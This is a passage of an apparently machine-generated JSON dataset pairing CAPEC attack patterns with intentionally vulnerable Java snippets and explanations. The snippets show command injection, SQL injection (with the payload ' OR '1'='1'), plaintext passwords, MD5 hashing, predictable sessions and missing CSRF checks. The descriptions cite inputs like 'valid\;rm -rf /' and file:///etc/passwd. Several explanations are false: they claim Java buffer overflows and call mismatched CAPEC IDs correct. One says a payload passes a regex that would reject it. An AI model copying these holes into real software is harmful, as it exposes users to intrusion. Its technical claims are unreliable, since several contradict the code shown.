        "code_snippet": "import java.io.ByteArrayOutputStream;\nimport java.io.IOException;\nimport java.util.Base64;\n\npublic class MimeConversion {\n    public static void main(String[] args) {\n        String input = \"VGhpcyBpcyBhIHRlc3Qgc3RyaW5nIHRoYXQgaXMgdG9vIGxvbmcgZm9yIHRoZSBidWZmZXIu\";\n        try {\n            byte[] decodedBytes = Base64.getDecoder().decode(input);\n            String result = convertToMime(decodedBytes);\n            System.out.println(result);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public static String convertToMime(byte[] input) throws IOException {\n        ByteArrayOutputStream outputStream = new ByteArrayOutputStream();\n        for (int i = 0; i < input.length; i++) {\n            outputStream.write(input[i]); // CWE-120: No size check on input\n        }\n        return outputStream.toString();\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable MIME conversion routine. The `convertToMime` method takes a byte array as input and writes it to a `ByteArrayOutputStream` without checking the size of the input, leading to a potential buffer overflow (CWE-120). The `main` method decodes a Base64-encoded string and passes the resulting byte array to the `convertToMime` method. This code embodies the main idea of the CAPEC by showing how an attacker could exploit a weakness in the MIME conversion routine to cause a buffer overflow and potentially gain control over the system. The lack of input size validation (CWE-20) and improper handling of memory buffers (CWE-119) are also highlighted in this example."
    },
    {
        "capec_id": "43",
        "capec_name": "Exploiting Multiple Input Interpretation Layers",
        "code_snippet": "import java.util.regex.Pattern;\n\npublic class VulnerableInputHandler {\n    public static void main(String[] args) {\n        String userInput = args[0];\n        String sanitizedInput = sanitizeInput(userInput);\n        if (isValidInput(sanitizedInput)) {\n            executeCommand(sanitizedInput);\n        } else {\n            System.out.println(\"Invalid input detected.\");\n        }\n    }\n\n    private static String sanitizeInput(String input) {\n        // First parser layer: remove escape characters\n        return input.replaceAll(\"\\\\\", \"\");\n    }\n\n    private static boolean isValidInput(String input) {\n        // Input validation layer\n        String regex = \"^[a-zA-Z0-9]+$\";\n        return Pattern.matches(regex, input);\n    }\n\n    private static void executeCommand(String input) {\n        // Second parser layer: execute command\n        try {\n            Runtime.getRuntime().exec(\"echo \" + input);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability where input validation is performed before all parsing layers are applied, embodying the CAPEC concept of 'Exploiting Multiple Input Interpretation Layers'. The `sanitizeInput` method removes escape characters, which is the first parsing layer. The `isValidInput` method then validates the sanitized input against a regex pattern. However, the `executeCommand` method, which represents the second parsing layer, executes the command with the user input. An attacker could exploit this by providing input that passes the initial validation but becomes dangerous after the escape characters are removed. For example, an input like 'valid\\;rm -rf /' would pass the validation but become 'valid;rm -rf /' after sanitization, leading to command injection (CWE-77, CWE-78)."
    },
    {
        "capec_id": "44",
        "capec_name": "Overflow Binary Resource File",
        "code_snippet": "import java.io.File;\nimport java.io.FileInputStream;\nimport java.io.IOException;\n\npublic class VulnerableImageLoader {\n    public static void main(String[] args) {\n        if (args.length != 1) {\n            System.out.println(\"Usage: java VulnerableImageLoader <image_path>\");\n            return;\n        }\n\n        String imagePath = args[0];\n        try {\n            byte[] imageData = loadImage(imagePath);\n            // Process the image data (omitted for brevity)\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public static byte[] loadImage(String path) throws IOException {\n        File file = new File(path);\n        FileInputStream fis = new FileInputStream(file);\n        byte[] buffer = new byte[(int) file.length()];\n        int bytesRead = fis.read(buffer);\n        if (bytesRead != buffer.length) {\n            throw new IOException(\"Failed to read the entire file\");\n        }\n        fis.close();\n        return buffer;\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable image loader that reads an image file into a byte array. The main idea is to show how a buffer overflow vulnerability can be exploited when handling binary resources like image files. The code does not perform any validation on the file size or content, which can lead to a buffer overflow if the file is maliciously crafted. This embodies the CAPEC 'Overflow Binary Resource File' and relates to CWE-120 (Buffer Copy without Checking Size of Input) and CWE-119 (Improper Restriction of Operations within the Bounds of a Memory Buffer). The code also implicitly touches on CWE-646 (Reliance on File Name or Extension of Externally-Supplied File) by assuming the file is a valid image based on its path."
    },
    {
        "capec_id": "45",
        "capec_name": "Buffer Overflow via Symbolic Links",
        "code_snippet": "import java.io.*;\n\npublic class SymbolicLinkBufferOverflow {\n    public static void main(String[] args) {\n        try {\n            // Create a symbolic link\n            File symLink = new File(\"/tmp/symlink\");\n            File targetFile = new File(\"/tmp/target\");\n            Process p = Runtime.getRuntime().exec(\"ln -s \" + targetFile.getAbsolutePath() + \" \" + symLink.getAbsolutePath());\n            p.waitFor();\n\n            // Read from the symbolic link\n            BufferedReader reader = new BufferedReader(new FileReader(symLink));\n            char[] buffer = new char[10];\n            int charsRead = reader.read(buffer);\n\n            // Vulnerable buffer copy without size check\n            char[] vulnerableBuffer = new char[charsRead];\n            System.arraycopy(buffer, 0, vulnerableBuffer, 0, buffer.length); // CWE-120\n\n            System.out.println(\"Read data: \" + new String(vulnerableBuffer));\n            reader.close();\n        } catch (IOException | InterruptedException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a potential buffer overflow vulnerability via symbolic links. The code creates a symbolic link pointing to a target file and then reads data from the symbolic link into a buffer. The buffer copy operation does not properly check the size of the input buffer, leading to a classic buffer overflow vulnerability (CWE-120). The code also highlights improper input validation (CWE-20) and improper restriction of operations within the bounds of a memory buffer (CWE-119). The main idea is to show how symbolic links can be manipulated to cause buffer overflows when the target software processes the symbolic link file without sufficient bounds checking."
    },
    {
        "capec_id": "46",
        "capec_name": "Overflow Variables and Tags",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.FileReader;\nimport java.io.IOException;\n\npublic class VulnerableConfigParser {\n    public static void main(String[] args) {\n        String filePath = \"config.txt\";\n        char[] buffer = new char[256]; // Fixed-size buffer\n\n        try (BufferedReader br = new BufferedReader(new FileReader(filePath))) {\n            int charsRead = br.read(buffer, 0, buffer.length);\n            if (charsRead == -1) {\n                System.out.println(\"Empty file\");\n                return;\n            }\n\n            String configData = new String(buffer, 0, charsRead);\n            System.out.println(\"Config Data: \" + configData);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable configuration file parser that reads data from a file into a fixed-size buffer without proper validation. The buffer is defined with a fixed size of 256 characters. The code reads the content of 'config.txt' into this buffer using a BufferedReader. If the file contains more than 256 characters, it will cause a buffer overflow, leading to potential security vulnerabilities. This snippet embodies the main idea of the CAPEC 'Overflow Variables and Tags' by showing how oversized strings in a configuration file can cause a buffer overflow. The related CWEs are represented as follows: CWE-120 (Buffer Copy without Checking Size of Input), CWE-118 (Incorrect Access of Indexable Resource), and CWE-119 (Improper Restriction of Operations within the Bounds of a Memory Buffer)."
    },
    {
        "capec_id": "47",
        "capec_name": "Buffer Overflow via Parameter Expansion",
        "code_snippet": "import java.util.Scanner;\n\npublic class BufferOverflowExample {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"Enter your input:\");\n        String userInput = scanner.nextLine();\n\n        // Vulnerable code: buffer overflow via parameter expansion\n        // CWE-120: Buffer Copy without Checking Size of Input\n        // CWE-131: Incorrect Calculation of Buffer Size\n        // CWE-20: Improper Input Validation\n        char[] buffer = new char[10];\n        try {\n            // Simulate parameter expansion by appending a fixed string\n            String expandedInput = userInput + \"_EXPANDED\";\n            for (int i = 0; i < expandedInput.length(); i++) {\n                buffer[i] = expandedInput.charAt(i); // CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer\n            }\n            System.out.println(\"Buffer content: \" + new String(buffer));\n        } catch (ArrayIndexOutOfBoundsException e) {\n            System.out.println(\"Buffer overflow detected!\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a buffer overflow vulnerability via parameter expansion. The program reads user input and appends a fixed string to simulate parameter expansion. The expanded input is then copied into a fixed-size buffer without checking if the buffer can accommodate the expanded input, leading to a potential buffer overflow. This example embodies the main idea of CAPEC-Buffer Overflow via Parameter Expansion and incorporates related CWEs such as CWE-120 (Buffer Copy without Checking Size of Input), CWE-131 (Incorrect Calculation of Buffer Size), CWE-119 (Improper Restriction of Operations within the Bounds of a Memory Buffer), and CWE-20 (Improper Input Validation)."
    },
    {
        "capec_id": "48",
        "capec_name": "Passing Local Filenames to Functions That Expect a URL",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableFileAccess {\n    public static void main(String[] args) {\n        try {\n            String input = args[0]; // Expecting a URL but could be a local file path\n            URL url = new URL(input);\n            BufferedReader in = new BufferedReader(new InputStreamReader(url.openStream()));\n            String inputLine;\n            while ((inputLine = in.readLine()) != null) {\n                System.out.println(inputLine);\n            }\n            in.close();\n        } catch (MalformedURLException e) {\n            e.printStackTrace();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability where a local file path is passed to a function expecting a URL. The program takes an input string (expected to be a URL) from the command line arguments and attempts to open it as a URL. If the input is a local file path (e.g., 'file:///etc/passwd'), the program will read the local file's contents and print them to the console. This can lead to exposure of sensitive local files. The code embodies the CAPEC by showing how improper handling of input types (CWE-241) and reliance on file names or extensions (CWE-646) can lead to security issues. Additionally, it demonstrates the risk of using incorrectly-resolved names or references (CWE-706) and improper neutralization of encoded URI schemes (CWE-84)."
    },
    {
        "capec_id": "49",
        "capec_name": "Password Brute Forcing",
        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\n\npublic class AuthenticationSystem {\n    private Map<String, String> userDatabase = new HashMap<>();\n    private Map<String, Integer> loginAttempts = new HashMap<>();\n    private static final int MAX_ATTEMPTS = 5;\n\n    public AuthenticationSystem() {\n        // Storing passwords in plaintext (CWE-257)\n        userDatabase.put(\"user1\", \"password123\");\n        userDatabase.put(\"user2\", \"123456\");\n    }\n\n    public boolean authenticate(String username, String password) {\n        if (!userDatabase.containsKey(username)) {\n            return false;\n        }\n\n        // Improper restriction of excessive authentication attempts (CWE-307)\n        loginAttempts.putIfAbsent(username, 0);\n        if (loginAttempts.get(username) >= MAX_ATTEMPTS) {\n            System.out.println(\"Account locked due to too many failed attempts.\");\n            return false;\n        }\n\n        if (userDatabase.get(username).equals(password)) {\n            loginAttempts.put(username, 0); // Reset attempts on successful login\n            return true;\n        } else {\n            loginAttempts.put(username, loginAttempts.get(username) + 1);\n            return false;\n        }\n    }\n\n    public static void main(String[] args) {\n        AuthenticationSystem authSystem = new AuthenticationSystem();\n        System.out.println(authSystem.authenticate(\"user1\", \"wrongpassword\")); // false\n        System.out.println(authSystem.authenticate(\"user1\", \"password123\")); // true\n    }\n}",
        "description": "This Java code snippet represents a simple authentication system that embodies the main idea of CAPEC-112: Password Brute Forcing. The code includes several weaknesses related to the described CWEs:\n\n1. **Weak Password Requirements (CWE-521)**: The passwords used in the user database are weak and easily guessable.\n2. **Storing Passwords in a Recoverable Format (CWE-257)**: Passwords are stored in plaintext, making them vulnerable to attacks if the database is compromised.\n3. **Improper Restriction of Excessive Authentication Attempts (CWE-307)**: The system does not implement sufficient measures to prevent multiple failed authentication attempts within a short time frame, making it susceptible to brute force attacks.\n\nThe `authenticate` method checks the provided username and password against the stored values. If the password is incorrect, it increments the login attempt counter. If the maximum number of attempts is reached, the account is locked. This demonstrates how an attacker could potentially exploit weak password policies and insufficient brute force protection to gain unauthorized access."
    },
    {
        "capec_id": "50",
        "capec_name": "Password Recovery Exploitation",
        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\n\npublic class PasswordRecovery {\n    private static Map<String, String> userDatabase = new HashMap<>();\n    private static Map<String, String> securityQuestions = new HashMap<>();\n\n    public static void main(String[] args) {\n        // Adding a user with a weak password and security question\n        userDatabase.put(\"user1\", \"password123\");\n        securityQuestions.put(\"user1\", \"What is your pet's name?\");\n\n        // Simulating password recovery\n        String username = \"user1\";\n        String answer = \"Fluffy\"; // Assume the attacker knows the answer\n\n        if (securityQuestions.get(username).equals(\"What is your pet's name?\") && answer.equals(\"Fluffy\")) {\n            System.out.println(\"Recovered password: \" + userDatabase.get(username));\n        } else {\n            System.out.println(\"Security answer incorrect.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a weak password recovery mechanism, embodying the main idea of CAPEC-139 (Password Recovery Exploitation). The code stores user passwords in a recoverable format (CWE-257) and uses a weak security question for password recovery (CWE-640). The password itself is weak (CWE-521), and the system relies on passwords for primary authentication (CWE-309). An attacker who knows the answer to the security question can easily recover the user's password, highlighting the vulnerability in the password recovery process."
    },
    {
        "capec_id": "51",
        "capec_name": "Poison Web Service Registry",
        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\n\npublic class WebServiceRegistry {\n    private Map<String, String> registry = new HashMap<>();\n\n    public void addService(String serviceName, String serviceEndpoint) {\n        // CWE-314: Storing service endpoint in cleartext\n        registry.put(serviceName, serviceEndpoint);\n    }\n\n    public String lookupService(String serviceName) {\n        // CWE-285: No authorization check\n        return registry.get(serviceName);\n    }\n\n    public void poisonRegistry(String serviceName, String maliciousEndpoint) {\n        // CWE-74: No input validation, allowing injection\n        registry.put(serviceName, maliciousEndpoint);\n    }\n\n    public static void main(String[] args) {\n        WebServiceRegistry registry = new WebServiceRegistry();\n        registry.addService(\"ExampleService\", \"http://example.com/service\");\n        System.out.println(\"Original Service Endpoint: \" + registry.lookupService(\"ExampleService\"));\n\n        // Poisoning the registry\n        registry.poisonRegistry(\"ExampleService\", \"http://malicious.com/service\");\n        System.out.println(\"Poisoned Service Endpoint: \" + registry.lookupService(\"ExampleService\"));\n    }\n}",
        "description": "This Java code snippet demonstrates a simple web service registry that can be poisoned. The registry stores service endpoints in cleartext (CWE-314) and lacks proper authorization checks (CWE-285). Additionally, it allows for injection attacks due to improper input validation (CWE-74). The `poisonRegistry` method simulates an attacker replacing a legitimate service endpoint with a malicious one, embodying the main idea of the 'Poison Web Service Registry' CAPEC. The code highlights the vulnerabilities that can lead to a poisoned registry, such as improper authorization, lack of input validation, and cleartext storage."
    },
    {
        "capec_id": "52",
        "capec_name": "Embedding NULL Bytes",
        "code_snippet": "import java.io.*;\n\npublic class NullByteInjection {\n    public static void main(String[] args) {\n        String userInput = \"user\\0input\";\n        processInput(userInput);\n    }\n\n    public static void processInput(String input) {\n        // CWE-20: Improper Input Validation\n        if (input == null || input.isEmpty()) {\n            System.out.println(\"Invalid input\");\n            return;\n        }\n\n        // CWE-158: Improper Neutralization of Null Byte or NUL Character\n        if (input.contains(\"\\0\")) {\n            System.out.println(\"Input contains null byte\");\n            return;\n        }\n\n        // CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component\n        try {\n            File file = new File(input + \".txt\");\n            FileWriter writer = new FileWriter(file);\n            writer.write(\"This is a test.\");\n            writer.close();\n            System.out.println(\"File created: \" + file.getName());\n        } catch (IOException e) {\n            System.out.println(\"An error occurred.\");\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability related to the 'Embedding NULL Bytes' CAPEC. The main function simulates user input containing a null byte (\\0). The processInput function attempts to validate the input but fails to properly neutralize the null byte, leading to potential security issues. The code checks for null or empty input (CWE-20) and for the presence of null bytes (CWE-158). If the input passes these checks, it proceeds to create a file using the input string, which could lead to improper file handling (CWE-74). This example highlights the importance of proper input validation and neutralization to prevent security vulnerabilities."
    },
    {
        "capec_id": "53",
        "capec_name": "Postfix, Null Terminate, and Backslash",
        "code_snippet": "import java.io.UnsupportedEncodingException;\n\npublic class NullByteInjection {\n    public static void main(String[] args) {\n        String userInput = \"user\\u0000input\"; // User input with embedded null byte\n        String sanitizedInput = sanitizeInput(userInput);\n        if (sanitizedInput.endsWith(\"/\")) {\n            System.out.println(\"Valid input: \" + sanitizedInput);\n        } else {\n            System.out.println(\"Invalid input\");\n        }\n    }\n\n    public static String sanitizeInput(String input) {\n        try {\n            byte[] bytes = input.getBytes(\"UTF-8\");\n            StringBuilder sanitized = new StringBuilder();\n            for (byte b : bytes) {\n                if (b != 0) { // Improper neutralization of null byte\n                    sanitized.append((char) b);\n                }\n            }\n            return sanitized.toString();\n        } catch (UnsupportedEncodingException e) {\n            return \"\";\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability related to the 'Postfix, Null Terminate, and Backslash' CAPEC. The code takes user input that may contain an embedded null byte (\\u0000) and attempts to sanitize it by removing null bytes. However, the sanitization process is flawed because it does not properly handle alternate encodings or ensure that the input is correctly validated. The main function checks if the sanitized input ends with a slash ('/'), but due to the improper neutralization of the null byte, an attacker could bypass this check by embedding a null byte in the input. This example highlights the importance of proper input validation and neutralization to prevent security vulnerabilities."
    },
    {
        "capec_id": "54",
        "capec_name": "Query System for Information",
        "code_snippet": "import java.sql.Connection;\nimport java.sql.DriverManager;\nimport java.sql.ResultSet;\nimport java.sql.SQLException;\nimport java.sql.Statement;\n\npublic class VulnerableApp {\n    public static void main(String[] args) {\n        String userInput = \"' OR '1'='1\"; // Simulated malicious input\n        String query = \"SELECT * FROM users WHERE username = '\" + userInput + \"'\";\n\n        try (Connection conn = DriverManager.getConnection(\"jdbc:mysql://localhost:3306/mydb\", \"user\", \"password\");\n             Statement stmt = conn.createStatement();\n             ResultSet rs = stmt.executeQuery(query)) {\n\n            while (rs.next()) {\n                System.out.println(\"User: \" + rs.getString(\"username\"));\n            }\n        } catch (SQLException e) {\n            e.printStackTrace(); // CWE-209: Generation of Error Message Containing Sensitive Information\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable application that is susceptible to SQL Injection (CWE-89) due to improper neutralization of special elements in the SQL query. The code constructs an SQL query using user input directly, without sanitization, allowing an attacker to manipulate the query logic (CWE-943). The error handling mechanism prints the stack trace, potentially exposing sensitive information (CWE-209). The main idea of the CAPEC is represented by the application's vulnerability to probing and information extraction through crafted queries."
    },
    {
        "capec_id": "55",
        "capec_name": "Rainbow Table Password Cracking",
        "code_snippet": "import java.security.MessageDigest;\nimport java.security.NoSuchAlgorithmException;\nimport java.util.Scanner;\n\npublic class WeakPasswordStorage {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.print(\"Enter your password: \");\n        String password = scanner.nextLine();\n        String hashedPassword = hashPassword(password);\n        System.out.println(\"Stored hashed password: \" + hashedPassword);\n    }\n\n    private static String hashPassword(String password) {\n        try {\n            MessageDigest md = MessageDigest.getInstance(\"MD5\"); // CWE-916: Insufficient computational effort\n            byte[] hashBytes = md.digest(password.getBytes());\n            StringBuilder sb = new StringBuilder();\n            for (byte b : hashBytes) {\n                sb.append(String.format(\"%02x\", b));\n            }\n            return sb.toString();\n        } catch (NoSuchAlgorithmException e) {\n            throw new RuntimeException(e);\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a weak password storage mechanism, which is vulnerable to rainbow table attacks. The code takes a user's password input, hashes it using the MD5 algorithm, and prints the hashed password. The use of MD5 (CWE-916) is a key weakness as it does not provide sufficient computational effort to resist password cracking attacks. This example embodies the main idea of CAPEC-165 (Rainbow Table Password Cracking) by showing how an attacker could exploit weak password hashing to retrieve the original password using pre-computed hash chains. The code also highlights related weaknesses such as weak encoding for passwords (CWE-261) and reliance on single-factor authentication (CWE-308)."
    },
    {
        "capec_id": "56",
        "capec_name": "DEPRECATED: Removing/short-circuiting 'guard logic'",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableServer {\n    public static void main(String[] args) throws IOException {\n        ServerSocket serverSocket = new ServerSocket(8080);\n        System.out.println(\"Server started on port 8080\");\n\n        while (true) {\n            Socket clientSocket = serverSocket.accept();\n            BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));\n            PrintWriter out = new PrintWriter(clientSocket.getOutputStream(), true);\n\n            String clientMessage = in.readLine();\n            if (clientMessage.equals(\"AUTHENTICATE\")) {\n                // Vulnerable guard logic\n                out.println(\"AUTH_SUCCESS\");\n            } else {\n                out.println(\"INVALID_COMMAND\");\n            }\n\n            // Critical operation that should be protected\n            String criticalOperation = in.readLine();\n            if (criticalOperation.equals(\"PERFORM_CRITICAL_OPERATION\")) {\n                out.println(\"CRITICAL_OPERATION_SUCCESS\");\n            } else {\n                out.println(\"UNKNOWN_OPERATION\");\n            }\n\n            clientSocket.close();\n        }\n    }\n}",
        "description": "This Java code snippet represents a vulnerable server that listens for client connections on port 8080. The server has a simple authentication mechanism where it expects the client to send the message 'AUTHENTICATE'. If this message is received, the server responds with 'AUTH_SUCCESS'. However, this guard logic is easily bypassed because it does not actually verify the client's identity or use any secure authentication mechanism. After the 'AUTHENTICATE' message, the server performs a critical operation based on the client's input without any further checks. This demonstrates the concept of removing or short-circuiting guard logic (CAPEC-207) and is related to CWE-287 (Authentication Bypass Issues) and CWE-602 (Client-Side Enforcement of Server-Side Security). The code is vulnerable to replay attacks and other forms of authentication bypass, making it insecure."
    },
    {
        "capec_id": "57",
        "capec_name": "Utilizing REST's Trust in the System Resource to Obtain Sensitive Data",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\n@WebServlet(\"/sensitiveData\")\npublic class SensitiveDataServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String sensitiveData = request.getParameter(\"token\"); // CWE-598: Sensitive data in query string\n        if (sensitiveData == null || !isValidToken(sensitiveData)) { // CWE-287: Improper Authentication\n            response.sendError(HttpServletResponse.SC_UNAUTHORIZED, \"Invalid token\");\n            return;\n        }\n        // Simulate SSL termination vulnerability\n        String data = getSensitiveDataFromResource(sensitiveData); // CWE-300: Channel Accessible by Non-Endpoint\n        response.getWriter().write(data);\n    }\n\n    private boolean isValidToken(String token) {\n        // Dummy validation for demonstration purposes\n        return \"validToken123\".equals(token);\n    }\n\n    private String getSensitiveDataFromResource(String token) {\n        // Simulate fetching sensitive data\n        return \"Sensitive Data for token: \" + token;\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a REST-style application that is vulnerable to several security weaknesses. The servlet processes a GET request containing a sensitive token in the query string (CWE-598). It performs a basic token validation (CWE-287), but the validation is insufficient. The code simulates a scenario where SSL termination occurs, and sensitive data is fetched from a resource based on the token (CWE-300). This setup represents the CAPEC's main idea of exploiting trust in system resources to obtain sensitive data once SSL is terminated. The code also highlights potential issues with protection mechanisms (CWE-693) and external control of critical state data (CWE-642)."
    },
    {
        "capec_id": "58",
        "capec_name": "Restful Privilege Elevation",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\n@WebServlet(\"/user\")\npublic class UserServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String userId = request.getParameter(\"userId\");\n        // No authorization check\n        // CWE-285: Improper Authorization\n        // CWE-650: Trusting HTTP Permission Methods on the Server Side\n        // CWE-269: Improper Privilege Management\n        // CWE-267: Privilege Defined With Unsafe Actions\n        // CWE-648: Incorrect Use of Privileged APIs\n        if (userId != null) {\n            // Perform some privileged action\n            deleteUserData(userId);\n            response.getWriter().write(\"User data deleted.\");\n        } else {\n            response.getWriter().write(\"User ID is required.\");\n        }\n    }\n\n    private void deleteUserData(String userId) {\n        // Simulate deletion of user data\n        System.out.println(\"Deleting data for user: \" + userId);\n    }\n}",
        "description": "This Java code snippet represents a vulnerable RESTful service where a GET request is used to perform a privileged action (deleting user data) without proper authorization checks. The servlet listens for GET requests at the '/user' endpoint and expects a 'userId' parameter. If the 'userId' is provided, it calls the 'deleteUserData' method to delete the user's data. This code embodies the main idea of the CAPEC 'Restful Privilege Elevation' by demonstrating how an adversary could exploit the lack of access control mechanisms to perform unauthorized actions. The related CWEs highlight the specific weaknesses: improper authorization (CWE-285), trusting HTTP permission methods (CWE-650), improper privilege management (CWE-269), unsafe actions with privileges (CWE-267), and incorrect use of privileged APIs (CWE-648)."
    },
    {
        "capec_id": "59",
        "capec_name": "Session Credential Falsification through Prediction",
        "code_snippet": "import java.security.SecureRandom;\nimport java.util.Random;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport javax.servlet.http.HttpSession;\n\npublic class VulnerableSessionServlet extends HttpServlet {\n    private static final Random random = new Random(); // CWE-330: Use of Insufficiently Random Values\n\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) {\n        HttpSession session = request.getSession();\n        if (session.isNew()) {\n            // CWE-6: Insufficient Session-ID Length\n            String sessionId = generatePredictableSessionId();\n            session.setAttribute(\"SESSION_ID\", sessionId);\n        }\n        // CWE-539: Use of Persistent Cookies Containing Sensitive Information\n        response.addCookie(new javax.servlet.http.Cookie(\"SESSION_ID\", (String) session.getAttribute(\"SESSION_ID\")));\n    }\n\n    private String generatePredictableSessionId() {\n        // CWE-331: Insufficient Entropy\n        int sessionId = random.nextInt(1000); // Predictable session ID\n        return String.valueOf(sessionId);\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerable implementation of session management. The code uses a predictable session ID generation mechanism (CWE-330, CWE-331) by utilizing a standard Random object and generating session IDs with insufficient entropy. The session ID is also stored in a persistent cookie (CWE-539), which can be easily predicted and exploited by an attacker to hijack sessions (CAPEC: Session Credential Falsification through Prediction). The session ID length is insufficient (CWE-6), making it easier for attackers to guess valid session IDs. This code highlights the importance of using secure random values and proper session management practices to prevent session hijacking and spoofing attacks."
    },
    {
        "capec_id": "60",
        "capec_name": "Reusing Session IDs (aka Session Replay)",
        "code_snippet": "import java.io.*;\nimport javax.servlet.*;\nimport javax.servlet.http.*;\n\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        HttpSession session = request.getSession();\n        String sessionId = session.getId();\n        String userId = (String) session.getAttribute(\"userId\");\n\n        if (userId == null) {\n            response.sendRedirect(\"login.jsp\");\n            return;\n        }\n\n        // Simulate sensitive operation\n        response.getWriter().println(\"Sensitive operation performed for user: \" + userId);\n    }\n\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String userId = request.getParameter(\"userId\");\n        String password = request.getParameter(\"password\");\n\n        // Simulate authentication\n        if (\"admin\".equals(userId) && \"password123\".equals(password)) {\n            HttpSession session = request.getSession();\n            session.setAttribute(\"userId\", userId);\n            response.sendRedirect(\"dashboard.jsp\");\n        } else {\n            response.sendRedirect(\"login.jsp\");\n        }\n    }\n}",
        "description": "This Java servlet code demonstrates a vulnerability to session replay attacks. The `doPost` method simulates user authentication by setting a session attribute `userId` upon successful login. The `doGet` method checks for the presence of this attribute to allow access to a sensitive operation. However, the session ID is reused without proper validation or expiration, making it susceptible to session hijacking if an attacker captures and reuses a valid session ID. This code embodies the CAPEC 'Reusing Session IDs (aka Session Replay)' and is related to CWEs such as 'Authentication Bypass by Capture-replay' (CWE-294) and 'Session Fixation' (CWE-384)."
    },
    {
        "capec_id": "61",
        "capec_name": "Session Fixation",
        "code_snippet": "import javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport javax.servlet.http.HttpSession;\nimport java.io.IOException;\n\npublic class LoginServlet extends HttpServlet {\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String username = request.getParameter(\"username\");\n        String password = request.getParameter(\"password\");\n\n        // Assume user authentication is successful\n        if (authenticateUser(username, password)) {\n            HttpSession session = request.getSession();\n            // Vulnerable: Not invalidating the existing session\n            session.setAttribute(\"user\", username);\n            response.getWriter().println(\"Login successful!\");\n        } else {\n            response.getWriter().println(\"Login failed!\");\n        }\n    }\n\n    private boolean authenticateUser(String username, String password) {\n        // Dummy authentication logic\n        return \"admin\".equals(username) && \"password\".equals(password);\n    }\n}",
        "description": "This Java servlet code demonstrates a session fixation vulnerability. When a user logs in, the existing session is not invalidated, allowing an attacker to provide a session identifier to the victim before login. Once the victim logs in, the attacker can use the same session identifier to gain unauthorized access. This code snippet embodies the main idea of CAPEC-384 (Session Fixation) and is related to CWE-384 (Session Fixation), CWE-664 (Improper Control of a Resource Through its Lifetime), and CWE-602 (Client-Side Enforcement of Server-Side Security)."
    },
    {
        "capec_id": "62",
        "capec_name": "Cross Site Request Forgery",
        "code_snippet": "import javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport javax.servlet.http.HttpSession;\nimport java.io.IOException;\n\npublic class VulnerableCSRFServlet extends HttpServlet {\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        HttpSession session = request.getSession(false);\n        if (session == null || session.getAttribute(\"user\") == null) {\n            response.sendError(HttpServletResponse.SC_UNAUTHORIZED, \"User not authenticated\");\n            return;\n        }\n\n        String action = request.getParameter(\"action\");\n        if (\"transferMoney\".equals(action)) {\n            String amount = request.getParameter(\"amount\");\n            String recipient = request.getParameter(\"recipient\");\n            // Perform the money transfer without CSRF protection\n            performMoneyTransfer(session.getAttribute(\"user\"), recipient, amount);\n            response.getWriter().write(\"Money transferred successfully\");\n        } else {\n            response.sendError(HttpServletResponse.SC_BAD_REQUEST, \"Invalid action\");\n        }\n    }\n\n    private void performMoneyTransfer(Object user, String recipient, String amount) {\n        // Logic to transfer money\n    }\n}",
